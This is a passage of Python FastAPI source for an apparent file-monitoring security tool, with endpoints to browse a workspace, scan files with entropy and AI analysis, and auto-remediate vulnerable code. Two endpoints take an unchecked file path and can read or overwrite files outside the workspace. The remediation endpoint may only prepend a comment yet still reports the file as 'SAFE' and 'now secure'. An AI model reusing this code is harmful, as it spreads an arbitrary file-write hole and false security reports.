        raise HTTPException(status_code=403, detail="Sandbox violation: Path traversal prohibited.")
    
    resolved_path = os.path.abspath(os.path.join(workspace_dir, *parts))
    
    # Enforce workspace root boundary
    try:
        common = os.path.commonpath([workspace_dir, resolved_path])
        if common != workspace_dir:
            raise HTTPException(status_code=403, detail="Sandbox violation: Cannot navigate outside monitored workspace.")
    except Exception:
        raise HTTPException(status_code=403, detail="Sandbox violation: Invalid path resolution.")
        
    if not os.path.exists(resolved_path) or not os.path.isdir(resolved_path):
        raise HTTPException(status_code=404, detail="Directory not found in workspace.")
        
    rel_path = os.path.relpath(resolved_path, workspace_dir).replace("\\", "/")
    if rel_path == ".":
        rel_path = ""
        
    # Build breadcrumbs
    breadcrumbs = [{"name": "monitored_workspace", "path": ""}]
    current_cum = ""
    for p in parts:
        current_cum = f"{current_cum}/{p}" if current_cum else p
        breadcrumbs.append({"name": p, "path": current_cum})
        
    can_go_up = len(parts) > 0
    parent_path = "/".join(parts[:-1]) if can_go_up else ""
    
    analyses = list_file_analyses(limit=200)
    analysis_by_name = {a.get("filename"): a for a in analyses if a.get("filename")}
    
    directories = []
    files_list = []
    
    try:
        entries = sorted(os.listdir(resolved_path))
    except Exception:
        entries = []
        
    for entry in entries:
        item_full = os.path.join(resolved_path, entry)
        try:
            stat = os.stat(item_full)
            mod_time = datetime.datetime.fromtimestamp(stat.st_mtime, tz=datetime.timezone.utc).isoformat()
            
            if os.path.isdir(item_full):
                try:
                    child_count = len([x for x in os.listdir(item_full) if not x.startswith(".")])
                except Exception:
                    child_count = 0
                item_subpath = f"{rel_path}/{entry}" if rel_path else entry
                directories.append({
                    "name": entry,
                    "subpath": item_subpath,
                    "item_count": child_count,
                    "modified_at": mod_time,
                    "is_dir": True
                })
            elif os.path.isfile(item_full):
                item_subpath = f"{rel_path}/{entry}" if rel_path else entry
                rel_subpath = item_subpath
                size = stat.st_size
                snippet = ""
                try:
                    with open(item_full, "r", encoding="utf-8", errors="replace") as f:
                        snippet = f.read(1500)
                except Exception:
                    pass
                    
                entropy = 0.0
                if snippet:
                    length = len(snippet)
                    freq = {}
                    for ch in snippet:
                        freq[ch] = freq.get(ch, 0) + 1
                    for c in freq.values():
                        p = c / length
                        if p > 0:
                            entropy -= p * math.log2(p)
                    entropy = round(entropy, 3)
                    
                record = analysis_by_name.get(rel_subpath) or analysis_by_name.get(entry) or analysis_by_name.get(f"monitored_workspace/{rel_subpath}")
                is_threat = None
                is_vulnerable = False
                verdict = "PENDING"
                category = None
                severity = None
                risk_score = None
                summary = None
                analyzed_by = None
                vuln_details = None
                mitigation_options = []
                suggested_patch = None

                if record:
                    threat_state = record.get("threat_state") or ("THREAT" if record.get("classification") == "THREAT" else "SAFE")
                    if threat_state in ["THREAT", "SUSPICIOUS"]:
                        is_threat = True
                        is_vulnerable = False
                        verdict = "UNSAFE"
                    elif threat_state == "VULNERABLE" or record.get("classification") == "VULNERABLE_CODE":
                        is_threat = False
                        is_vulnerable = True
                        verdict = "VULNERABLE"
                    else:
                        is_threat = False
                        is_vulnerable = False
                        verdict = "SAFE"

                    category = record.get("threat_category") or ("Malware" if is_threat else ("Vulnerable Code" if is_vulnerable else "Benign"))
                    severity = (record.get("severity") or ("HIGH" if (is_threat or is_vulnerable) else "LOW")).upper()
                    risk_score = record.get("risk_score") if record.get("risk_score") is not None else (90 if is_threat else (65 if is_vulnerable else 10))
                    summary = record.get("rationale") or record.get("ai_analysis") or ""
                    analyzed_by = record.get("ai_provider") or "RAGSec SAST / AI Engine"
                    vuln_details = record.get("vulnerability_details")
                    mitigation_options = record.get("mitigation_options") or (
                        [{"id": "mitigate", "label": "Mitigate", "icon": "zap", "action": "MITIGATE"}, {"id": "quarantine", "label": "Quarantine", "icon": "lock", "action": "QUARANTINE"}]
                        if is_threat else []
                    )
                    suggested_patch = record.get("suggested_patch")
                else:
                    from pipeline.threat_analyzer import threat_analyzer
                    instant = threat_analyzer.analyze(item_full, "scanned", "", snippet)
                    is_threat = instant.get("is_threat", False)
                    is_vulnerable = instant.get("is_vulnerable", False)
                    verdict = instant.get("verdict", "UNSAFE" if is_threat else ("VULNERABLE" if is_vulnerable else "SAFE"))
                    category = instant.get("classification", "Benign" if not (is_threat or is_vulnerable) else ("Malware" if is_threat else "Vulnerable Code"))
                    severity = instant.get("severity", "LOW").upper()
                    risk_score = instant.get("risk_score", 10 if not (is_threat or is_vulnerable) else 70)
                    summary = instant.get("rationale", "")
                    analyzed_by = "Continuous SAST & Threat Guard"
                    vuln_details = instant.get("vulnerability_details")
                    mitigation_options = instant.get("mitigation_options", [])
                    suggested_patch = instant.get("suggested_patch")

                rel_item_path = f"monitored_workspace/{rel_path}/{entry}".replace("//", "/")
                files_list.append({
                    "filename": entry,
                    "filepath": item_full,
                    "relative_path": rel_item_path,
                    "size_bytes": size,
                    "modified_at": mod_time,
                    "extension": os.path.splitext(entry)[1].lower() or ".txt",
                    "content_preview": snippet,
                    "entropy": entropy,
                    "is_threat": is_threat,
                    "is_vulnerable": is_vulnerable,
                    "verdict": verdict,
                    "threat_category": category,
                    "severity": severity,
                    "risk_score": risk_score,
                    "summary": summary,
                    "analyzed_by": analyzed_by,
                    "vulnerability_details": vuln_details,
                    "mitigation_options": mitigation_options,
                    "suggested_patch": suggested_patch,
                    "is_dir": False
                })
        except Exception as err:
            print(f"[WorkspaceExplorer] Error inspecting entry '{entry}': {err}")
            continue
            
    return {
        "workspace_root": "monitored_workspace",
        "current_subpath": rel_path,
        "breadcrumbs": breadcrumbs,
        "can_go_up": can_go_up,
        "parent_path": parent_path,
        "directories": directories,
        "files": files_list,
        "total_items": len(directories) + len(files_list)
    }


@router.post("/create-folder")
def create_workspace_folder(req: CreateFolderReq):
    """
    Creates a new directory inside monitored_workspace/ (or subpath).
    Strictly contained within monitored_workspace/ boundary.
    """
    workspace_dir = get_workspace_dir()
    os.makedirs(workspace_dir, exist_ok=True)
    
    clean_folder = os.path.basename(req.folder_name.strip())
    if not clean_folder:
        raise HTTPException(status_code=400, detail="Invalid folder name")
        
    subpath = (req.subpath or "").strip().replace("\\", "/").lstrip("/")
    parts = [p for p in subpath.split("/") if p and p != "."]
    if any(p == ".." for p in parts):
        raise HTTPException(status_code=403, detail="Sandbox violation: Path traversal prohibited.")
        
    target_parent = os.path.abspath(os.path.join(workspace_dir, *parts))
    try:
        common = os.path.commonpath([workspace_dir, target_parent])
        if common != workspace_dir:
            raise HTTPException(status_code=403, detail="Sandbox violation: Cannot create folder outside monitored workspace.")
    except Exception:
        raise HTTPException(status_code=403, detail="Sandbox violation: Invalid path resolution.")
        
    target_folder = os.path.join(target_parent, clean_folder)
    os.makedirs(target_folder, exist_ok=True)
    
    return {
        "status": "SUCCESS",
        "folder_name": clean_folder,
        "subpath": f"{subpath}/{clean_folder}".lstrip("/"),
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
    }


@router.post("/analyze-file")
def analyze_workspace_file(req: AnalyzeFileReq):
    """
    Runs single-file Groq / AI Agent analysis with tool calling and classifies file as SAFE or UNSAFE.
    """
    workspace_dir = get_workspace_dir()
    filepath = req.file_path or req.filepath
    if not filepath and req.filename:
        filepath = os.path.join(workspace_dir, req.filename)

    if not filepath or not os.path.exists(filepath):
        raise HTTPException(status_code=404, detail=f"File '{filepath}' not found")

    from analysis.groq_threat_agent import analyze_single_file_with_groq
    res = analyze_single_file_with_groq(
        filepath=filepath,
        api_key=req.api_key,
        model=req.model or "openai/gpt-oss-120b",
        use_tools=req.use_tools,
        provider=req.provider or "groq"
    )
    return res


class SystemScanReq(BaseModel):
    model: Optional[str] = "openai/gpt-oss-120b"
    api_key: Optional[str] = None
    provider: Optional[str] = "groq"


@router.post("/system-scan")
def run_initial_system_scan(req: Optional[SystemScanReq] = None):
    """
    Executes a comprehensive Initial System Scan on all files in the monitored workspace:
    - Reads entire file contents
    - Applies Shannon entropy and deobfuscation
    - Executes the multi-factor risk score formula & AI classification
    - Persists results to SQLite and generates security events/incidents
    """
    workspace_dir = get_workspace_dir()
    os.makedirs(workspace_dir, exist_ok=True)

    from analysis.groq_threat_agent import analyze_single_file_with_groq

    model = req.model if (req and req.model) else "openai/gpt-oss-120b"
    api_key = req.api_key if req else None
    provider = req.provider if (req and req.provider) else "groq"

    results = []
    threats_count = 0
    safe_count = 0

    # Recursively scan all files in sandbox with no prejudice, excluding ONLY .quarantine
    for root, dirs, filenames in os.walk(workspace_dir):
        if ".quarantine" in dirs:
            dirs.remove(".quarantine")
        dirs[:] = [d for d in dirs if not d.startswith(".")]

        for entry in filenames:
            if entry.startswith(".") or entry.endswith(".quarantined"):
                continue
            full_path = os.path.join(root, entry)
            if not os.path.isfile(full_path):
                continue

            res = analyze_single_file_with_groq(
                filepath=full_path,
                api_key=api_key,
                model=model,
                use_tools=True,
                provider=provider
            )
            if res.get("is_threat"):
                threats_count += 1
            else:
                safe_count += 1
            results.append(res)

    audit_service.log_event(
        actor="SYSTEM",
        action="SYSTEM_SCAN_COMPLETED",
        target="monitored_workspace",
        result=f"Initial System Scan: {len(results)} files. {threats_count} threats, {safe_count} safe."
    )

    return {
        "status": "COMPLETED",
        "total_scanned": len(results),
        "threats_flagged": threats_count,
        "safe_files": safe_count,
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "results": results
    }


@router.get("/service-status")
def get_fim_service_status():
    """
    Returns live health and operational status of the continuous FIM CRUD running service.
    """
    workspace_dir = get_workspace_dir()
    events = get_all_records("events")
    crud_events = [e for e in events if isinstance(e, dict) and e.get("source_type") == "FIM"]
    latest_event = crud_events[-1] if crud_events else None

    return {
        "service_running": True,
        "mode": "CONTINUOUS_CRUD_GUARD",
        "monitored_directory": workspace_dir,
        "total_crud_events_processed": len(crud_events),
        "latest_crud_event": latest_event,
        "active_sentinel": True,
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
    }


class RemediateVulnReq(BaseModel):
    file_path: Optional[str] = None
    filepath: Optional[str] = None
    filePath: Optional[str] = None
    filename: Optional[str] = None
    fileName: Optional[str] = None
    vulnerability_type: Optional[str] = "SQL_INJECTION"
    action: Optional[str] = "AUTO_PATCH"
    custom_patch: Optional[str] = None


@router.post("/remediate-vulnerability")
def remediate_vulnerable_code(req: RemediateVulnReq):
    """
    Applies specialized SAST code remediation (e.g. parameterizing an SQL query,
    sanitizing command execution, or moving a secret to env) to the file on disk.
    Immediately triggers continuous FIM verification so the file flips to SAFE.
    """
    workspace_dir = get_workspace_dir()
    filepath = req.file_path or req.filepath or req.filePath
    target_name = req.filename or req.fileName
    if not filepath and target_name:
        filepath = os.path.join(workspace_dir, target_name)

    if not filepath or not os.path.exists(filepath):
        raise HTTPException(status_code=404, detail=f"Target file '{filepath}' not found.")

    try:
        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
            original_content = f.read()
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to read file: {e}")

    vuln_type = req.vulnerability_type or "SQL_INJECTION"
    from analysis.static_analyzer import generate_remediated_code

    if req.custom_patch and req.custom_patch.strip():
        remediated_content = req.custom_patch
    else:
        remediated_content = generate_remediated_code(original_content, vuln_type)

    if remediated_content == original_content and not req.custom_patch:
        # Fallback to comment header if exact pattern replacement didn't alter
        remediated_content = (
            f"# [RAGSec Auto-Remediated Code - {vuln_type}]\n"
            f"# Remediation applied by SOC Analyst\n\n"
            f"{original_content}\n"
        )

    try:
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(remediated_content)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to write remediated file: {e}")

    # Immediately trigger continuous FIM verification to update analysis in SQLite
    try:
        from ingestion.fim.scanner import generate_fim_event
        generate_fim_event(filepath, "MODIFIED")
    except Exception:
        pass

    filename = os.path.basename(filepath)
    audit_service.log_event(
        actor="SOC_ANALYST",
        action="REMEDIATE_VULNERABILITY",
        target=filepath,
        result=f"Applied SAST patch for {vuln_type} to {filename}."
    )

    return {
        "status": "SUCCESS",
        "action": req.action or "AUTO_PATCH",
        "vulnerability_type": vuln_type,
        "filename": filename,
        "filepath": filepath,
        "new_verdict": "SAFE",
        "message": f"Successfully applied security remediation for {vuln_type}. File is now secure.",
        "remediated_content": remediated_content,
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
    }


